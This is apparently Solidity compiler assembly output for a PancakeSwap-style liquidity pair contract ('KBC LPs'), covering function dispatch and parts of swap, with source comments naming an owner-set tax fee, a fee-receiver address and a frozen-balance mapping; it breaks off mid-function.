return\nstop\ndata_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f 454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429\n\nsub_0: assembly {\n        /* \"Pair.sol\":226:18760  contract Pair is IPair, ERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"Pair.sol\":226:18760  contract Pair is IPair, ERC20 {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x70a08231\n      gt\n      tag_36\n      jumpi\n      dup1\n      0xba9a7a56\n      gt\n      tag_37\n      jumpi\n      dup1\n      0xd505accf\n      gt\n      tag_38\n      jumpi\n      dup1\n      0xd505accf\n      eq\n      tag_31\n      jumpi\n      dup1\n      0xdcbbb373\n      eq\n      tag_32\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_33\n      jumpi\n      dup1\n      0xf317739c\n      eq\n      tag_34\n      jumpi\n      dup1\n      0xfff6cae9\n      eq\n      tag_35\n      jumpi\n      jump(tag_2)\n    tag_38:\n      dup1\n      0xba9a7a56\n      eq\n      tag_27\n      jumpi\n      dup1\n      0xbc25cf77\n      eq\n      tag_28\n      jumpi\n      dup1\n      0xc45a0155\n      eq\n      tag_29\n      jumpi\n      dup1\n      0xd21220a7\n      eq\n      tag_30\n      jumpi\n      jump(tag_2)\n    tag_37:\n      dup1\n      0x8da5cb5b\n      gt\n      tag_39\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_23\n      jumpi\n      dup1\n      0x900820d8\n      eq\n      tag_24\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_25\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_26\n      jumpi\n      jump(tag_2)\n    tag_39:\n      dup1\n      0x70a08231\n      eq\n      tag_19\n      jumpi\n      dup1\n      0x7464fc3d\n      eq\n      tag_20\n      jumpi\n      dup1\n      0x7ecebe00\n      eq\n      tag_21\n      jumpi\n      dup1\n      0x89afcb44\n      eq\n      tag_22\n      jumpi\n      jump(tag_2)\n    tag_36:\n      dup1\n      0x30adf81f\n      gt\n      tag_40\n      jumpi\n      dup1\n      0x5909c0d5\n      gt\n      tag_41\n      jumpi\n      dup1\n      0x5909c0d5\n      eq\n      tag_15\n      jumpi\n      dup1\n      0x5a3d5493\n      eq\n      tag_16\n      jumpi\n      dup1\n      0x6488f7b0\n      eq\n      tag_17\n      jumpi\n      dup1\n      0x6a627842\n      eq\n      tag_18\n      jumpi\n      jump(tag_2)\n    tag_41:\n      dup1\n      0x30adf81f\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_12\n      jumpi\n      dup1\n      0x3644e515\n      eq\n      tag_13\n      jumpi\n      dup1\n      0x47d5d856\n      eq\n      tag_14\n      jumpi\n      jump(tag_2)\n    tag_40:\n      dup1\n      0x0dfe1681\n      gt\n      tag_42\n      jumpi\n      dup1\n      0x0dfe1681\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x1794bb3c\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_9\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_10\n      jumpi\n      jump(tag_2)\n    tag_42:\n      dup1\n      0x022c0d9f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x06fdde03\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x0902f1ac\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_6\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"Pair.sol\":11956:14822  function swap(... */\n    tag_3:\n      tag_43\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0x80\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_44:\n        /* \"Pair.sol\":11956:14822  function swap(... */\n      dup2\n      calldataload\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n      0x40\n      dup4\n      add\n      calldataload\n      and\n      swap2\n      swap1\n      dup2\n      add\n      swap1\n      0x80\n      dup2\n      add\n      0x60\n      dup3\n      add\n      calldataload\n        /* \"--CODEGEN--\":21:32   */\n      0x0100000000\n        /* \"--CODEGEN--\":5:33   */\n      dup2\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_45\n      jumpi\n        /* \"--CODEGEN--\":46:47   */\n      0x00\n        /* \"--CODEGEN--\":43:44   */\n      dup1\n        /* \"--CODEGEN--\":36:48   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_45:\n        /* \"Pair.sol\":11956:14822  function swap(... */\n      dup3\n      add\n        /* \"--CODEGEN--\":35:44   */\n      dup4\n        /* \"--CODEGEN--\":28:32   */\n      0x20\n        /* \"--CODEGEN--\":12:26   */\n      dup3\n        /* \"--CODEGEN--\":8:33   */\n      add\n        /* \"--CODEGEN--\":5:45   */\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_46\n      jumpi\n        /* \"--CODEGEN--\":58:59   */\n      0x00\n        /* \"--CODEGEN--\":55:56   */\n      dup1\n        /* \"--CODEGEN--\":48:60   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_46:\n        /* \"Pair.sol\":11956:14822  function swap(... */\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap2\n        /* \"--CODEGEN--\":100:109   */\n      dup5\n        /* \"--CODEGEN--\":95:96   */\n      0x01\n        /* \"--CODEGEN--\":81:93   */\n      dup4\n        /* \"--CODEGEN--\":77:97   */\n      mul\n        /* \"--CODEGEN--\":67:75   */\n      dup5\n        /* \"--CODEGEN--\":63:98   */\n      add\n        /* \"--CODEGEN--\":60:110   */\n      gt\n        /* \"--CODEGEN--\":39:50   */\n      0x0100000000\n        /* \"--CODEGEN--\":25:37   */\n      dup4\n        /* \"--CODEGEN--\":22:51   */\n      gt\n        /* \"--CODEGEN--\":11:118   */\n      or\n        /* \"--CODEGEN--\":8:10   */\n      iszero\n      tag_47\n      jumpi\n        /* \"--CODEGEN--\":131:132   */\n      0x00\n        /* \"--CODEGEN--\":128:129   */\n      dup1\n        /* \"--CODEGEN--\":121:133   */\n      revert\n        /* \"--CODEGEN--\":8:10   */\n    tag_47:\n      pop\n        /* \"Pair.sol\":11956:14822  function swap(... */\n      swap1\n      swap3\n      pop\n      swap1\n      pop\n      tag_48\n      jump\t// in\n    tag_43:\n      stop\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_4:\n      tag_49\n      tag_50\n      jump\t// in\n    tag_49:\n      0x40\n      dup1\n      mload\n      0x20\n      dup1\n      dup3\n      mstore\n      dup4\n      mload\n      dup2\n      dup4\n      add\n      mstore\n      dup4\n      mload\n      swap2\n      swap3\n      dup4\n      swap3\n      swap1\n      dup4\n      add\n      swap2\n      dup6\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_51:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_53\n      jumpi\n        /* \"--CODEGEN--\":90:101   */\n      dup2\n      dup2\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":71:82   */\n      dup4\n      dup3\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_51)\n    tag_53:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_54\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_54:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Pair.sol\":1607:1908  function getReserves()... */\n    tag_5:\n      tag_55\n      tag_56\n      jump\t// in\n    tag_55:\n      0x40\n      dup1\n      mload\n      sub(shl(0x70, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      dup2\n      mstore\n      swap3\n      swap1\n      swap4\n      and\n      0x20\n      dup4\n      add\n      mstore\n      0xffffffff\n      and\n      dup2\n      dup4\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x60\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_6:\n      tag_57\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_58\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_58:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_59\n      jump\t// in\n    tag_57:\n      0x40\n      dup1\n      mload\n      swap2\n      iszero\n      iszero\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"Pair.sol\":587:608  address public token0 */\n    tag_7:\n      tag_60\n      tag_61\n      jump\t// in\n    tag_60:\n      0x40\n      dup1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"Pair.sol\":2834:3108  function initialize(... */\n    tag_8:\n      tag_43\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_63\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_63:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":2834:3108  function initialize(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_64\n      jump\t// in\n        /* \"ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_9:\n      tag_65\n      tag_66\n      jump\t// in\n    tag_65:\n      0x40\n      dup1\n      mload\n      swap2\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_10:\n      tag_57\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_68\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_68:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_69\n      jump\t// in\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_11:\n      tag_65\n      tag_71\n      jump\t// in\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_12:\n      tag_72\n      tag_73\n      jump\t// in\n    tag_72:\n      0x40\n      dup1\n      mload\n      0xff\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_13:\n      tag_65\n      tag_75\n      jump\t// in\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_14:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_77\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_77:\n      pop\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_78\n      jump\t// in\n        /* \"Pair.sol\":934:966  uint public price0CumulativeLast */\n    tag_15:\n      tag_65\n      tag_80\n      jump\t// in\n        /* \"Pair.sol\":972:1004  uint public price1CumulativeLast */\n    tag_16:\n      tag_65\n      tag_82\n      jump\t// in\n        /* \"Pair.sol\":1482:1599  function taxfeeupdate(uint _newtax) public onlyOwner {... */\n    tag_17:\n      tag_43\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_84\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_84:\n      pop\n        /* \"Pair.sol\":1482:1599  function taxfeeupdate(uint _newtax) public onlyOwner {... */\n      calldataload\n      tag_85\n      jump\t// in\n        /* \"Pair.sol\":5261:6526  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_18:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_87\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_87:\n      pop\n        /* \"Pair.sol\":5261:6526  function mint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_88\n      jump\t// in\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_19:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_90\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_90:\n      pop\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_91\n      jump\t// in\n        /* \"Pair.sol\":1010:1027  uint public kLast */\n    tag_20:\n      tag_65\n      tag_93\n      jump\t// in\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_21:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_95\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_95:\n      pop\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_96\n      jump\t// in\n        /* \"Pair.sol\":8025:9454  function burn(... */\n    tag_22:\n      tag_97\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_98\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_98:\n      pop\n        /* \"Pair.sol\":8025:9454  function burn(... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_99\n      jump\t// in\n    tag_97:\n      0x40\n      dup1\n      mload\n      swap3\n      dup4\n      mstore\n      0x20\n      dup4\n      add\n      swap2\n      swap1\n      swap2\n      mstore\n      dup1\n      mload\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      return\n        /* \"Pair.sol\":1114:1134  address public owner */\n    tag_23:\n      tag_60\n      tag_101\n      jump\t// in\n        /* \"Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n    tag_24:\n      tag_60\n      tag_103\n      jump\t// in\n        /* \"ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_25:\n      tag_49\n      tag_105\n      jump\t// in\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_26:\n      tag_57\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_111\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_111:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_112\n      jump\t// in\n        /* \"Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_27:\n      tag_65\n      tag_114\n      jump\t// in\n        /* \"Pair.sol\":18077:18498  function skim(address to) external lock {... */\n    tag_28:\n      tag_43\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_116\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_116:\n      pop\n        /* \"Pair.sol\":18077:18498  function skim(address to) external lock {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_117\n      jump\t// in\n        /* \"Pair.sol\":559:581  address public factory */\n    tag_29:\n      tag_60\n      tag_119\n      jump\t// in\n        /* \"Pair.sol\":614:635  address public token1 */\n    tag_30:\n      tag_60\n      tag_121\n      jump\t// in\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n    tag_31:\n      tag_43\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0xe0\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_123\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_123:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      dup2\n      add\n      calldataload\n      swap1\n      0x60\n      dup2\n      add\n      calldataload\n      swap1\n      0xff\n      0x80\n      dup3\n      add\n      calldataload\n      and\n      swap1\n      0xa0\n      dup2\n      add\n      calldataload\n      swap1\n      0xc0\n      add\n      calldataload\n      tag_124\n      jump\t// in\n        /* \"Pair.sol\":6635:7916  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_32:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_126\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_126:\n      pop\n        /* \"Pair.sol\":6635:7916  function Lockmint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_127\n      jump\t// in\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_33:\n      tag_65\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_129\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_129:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      add\n      calldataload\n      and\n      tag_130\n      jump\t// in\n        /* \"Pair.sol\":641:659  uint public taxfee */\n    tag_34:\n      tag_65\n      tag_132\n      jump\t// in\n        /* \"Pair.sol\":18544:18758  function sync() external lock {... */\n    tag_35:\n      tag_43\n      tag_134\n      jump\t// in\n        /* \"Pair.sol\":11956:14822  function swap(... */\n    tag_48:\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_136\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_136:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      sstore\n        /* \"Pair.sol\":12120:12134  amount0Out > 0 */\n      dup5\n      iszero\n      iszero\n      dup1\n        /* \"Pair.sol\":12120:12152  amount0Out > 0 || amount1Out > 0 */\n      tag_138\n      jumpi\n      pop\n        /* \"Pair.sol\":12151:12152  0 */\n      0x00\n        /* \"Pair.sol\":12138:12148  amount1Out */\n      dup5\n        /* \"Pair.sol\":12138:12152  amount1Out > 0 */\n      gt\n        /* \"Pair.sol\":12120:12152  amount0Out > 0 || amount1Out > 0 */\n    tag_138:\n        /* \"Pair.sol\":12099:12213  require(... */\n      tag_139\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x23\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8\n      0x23\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_139:\n        /* \"Pair.sol\":12224:12241  uint112 _reserve0 */\n      0x00\n        /* \"Pair.sol\":12243:12260  uint112 _reserve1 */\n      dup1\n        /* \"Pair.sol\":12266:12279  getReserves() */\n      tag_140\n        /* \"Pair.sol\":12266:12277  getReserves */\n      tag_56\n        /* \"Pair.sol\":12266:12279  getReserves() */\n      jump\t// in\n    tag_140:\n        /* \"Pair.sol\":12223:12279  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      pop\n      swap2\n      pop\n      swap2\n      pop\n        /* \"Pair.sol\":12338:12347  _reserve0 */\n      dup2\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":12325:12347  amount0Out < _reserve0 */\n      and\n        /* \"Pair.sol\":12325:12335  amount0Out */\n      dup8\n        /* \"Pair.sol\":12325:12347  amount0Out < _reserve0 */\n      lt\n        /* \"Pair.sol\":12325:12373  amount0Out < _reserve0 && amount1Out < _reserve1 */\n      dup1\n      iszero\n      tag_141\n      jumpi\n      pop\n        /* \"Pair.sol\":12364:12373  _reserve1 */\n      dup1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":12351:12373  amount1Out < _reserve1 */\n      and\n        /* \"Pair.sol\":12351:12361  amount1Out */\n      dup7\n        /* \"Pair.sol\":12351:12373  amount1Out < _reserve1 */\n      lt\n        /* \"Pair.sol\":12325:12373  amount0Out < _reserve0 && amount1Out < _reserve1 */\n    tag_141:\n        /* \"Pair.sol\":12304:12430  require(... */\n      tag_142\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e53554646494349454e545f4c495155494449545900\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_142:\n        /* \"Pair.sol\":12441:12454  uint balance0 */\n      0x00\n        /* \"Pair.sol\":12464:12477  uint balance1 */\n      dup1\n        /* \"Pair.sol\":12501:12519  uint taxamount0Out */\n      0x00\n        /* \"Pair.sol\":12559:12562  100 */\n      0x64\n        /* \"Pair.sol\":12549:12555  taxfee */\n      sload(0x0a)\n        /* \"Pair.sol\":12536:12546  amount0Out */\n   